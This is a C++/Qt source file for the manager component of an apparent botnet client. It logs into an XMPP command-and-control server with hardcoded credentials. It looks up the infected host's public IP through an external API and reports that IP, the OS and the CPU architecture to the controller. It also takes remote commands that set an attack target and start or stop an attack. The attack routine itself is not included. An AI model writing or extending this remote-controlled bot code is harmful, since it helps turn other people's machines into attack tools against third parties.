#include "botmanager.h"
#include "global.h"
#include "xmppclient.h"
#include "bot.h"
#include "storagemanager.h"
#include "getstatuscommand.h"
#include "getbotstatecommand.h"
#include "startattackcommand.h"
#include "stopattackcommand.h"
#include "botstateresponse.h"
#include "attackstartedresponse.h"
#include "attackstoppedresponse.h"
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QUrl>
#include <QNetworkInterface>
#include <QSysInfo>
#include <QDebug>

BotManager *BotManager::instance()
{
    static BotManager manager;

    return &manager;
}

void BotManager::connectToCC()
{
    QString jid = StorageManager::readConfig("jid").toString();
    QString password = StorageManager::readConfig("password").toString();

    _xmppClient -> connectToServer(jid, password);
}


void BotManager::disconnectFromCC()
{
    _xmppClient -> disconnectFromServer();
}

void BotManager::readyOnXmppClient()
{
    _bot -> setState(WaitingForCommand);
}

void BotManager::commandReceivedOnBot(Message *command)
{
    Message *response = 0;
    bool isValid = true;

    qDebug() << "Command received from" << command -> from();

    if(dynamic_cast<GetStatusCommand *>(command) ||
       dynamic_cast<GetBotStateCommand *>(command)) {
        response = new BotStateResponse;
        dynamic_cast<BotStateResponse *>(response) -> setBot(_bot);
    } else if(StartAttackCommand *startAttackCommand = dynamic_cast<StartAttackCommand *>(command)) {
        response = new AttackStartedResponse(command -> id());
        _target = startAttackCommand -> target();
        _bot -> setState(AttackInProgress);
    } else if(dynamic_cast<StopAttackCommand *>(command)) {
        response = new AttackStoppedResponse(command -> id());
        _bot -> setState(WaitingForCommand);
    } else
        isValid = false;

    if(isValid) {
        response -> setTo(command -> from());
        _xmppClient -> sendResponse(*response);
    }

    delete command;
}

void BotManager::finishedOnNetworkAccessManager(QNetworkReply *reply)
{
    QString ip;

    if(reply -> error() == QNetworkReply::NoError)
        ip = QString::fromLatin1(reply -> readAll());

    setupBot(ip);

    reply -> deleteLater();
}

BotManager::BotManager()
{
    _xmppClient = new XmppClient(APPLICATION_NAME);
    _xmppClient -> setParent(this);

    _bot = new Bot;

    _target = "";

    _networkAccessManager = new QNetworkAccessManager(this);

    createConnections();

    setupConfig();
    sendHttpGetRequestToDiscoverIp();
}

BotManager::~BotManager()
{
    disconnectFromCC();

    delete _xmppClient;
    delete _bot;
}

void BotManager::createConnections()
{
    connect(_xmppClient, SIGNAL(ready()),
            this, SLOT(readyOnXmppClient()));
    connect(_xmppClient, SIGNAL(commandReceived(Message *)),
            this, SLOT(commandReceivedOnBot(Message *)));
    connect(_networkAccessManager, SIGNAL(finished(QNetworkReply *)),
            this, SLOT(finishedOnNetworkAccessManager(QNetworkReply *)));
}

void BotManager::setupConfig()
{
    if(!StorageManager::existsConfig() && StorageManager::createConfig()) {
        StorageManager::writeConfig("jid", "bot1@jabber.odyssey.net");
        StorageManager::writeConfig("password", "1234");
    }
}

void BotManager::setupBot(const QString& pubIp)
{
    QString ip = pubIp;

    if(ip.isNull()) {
        foreach(QHostAddress address, QNetworkInterface::allAddresses())
            if(address != QHostAddress::LocalHost && address != QHostAddress::LocalHostIPv6) {
                ip = address.toString();
                break;
            }
    }

    QString id = StorageManager::readConfig("jid").toString();
    QString os = QString("%1 %2").arg(QSysInfo::prettyProductName()).arg(QSysInfo::currentCpuArchitecture());

    _bot -> setId(id);
    _bot -> setIp(ip);
    _bot -> setOs(os);
    _bot -> setState(WaitingForCC);

    emit ready();
}

void BotManager::sendHttpGetRequestToDiscoverIp()
{
    _networkAccessManager -> get(QNetworkRequest(QUrl(IP_ADDRESS_API)));
}
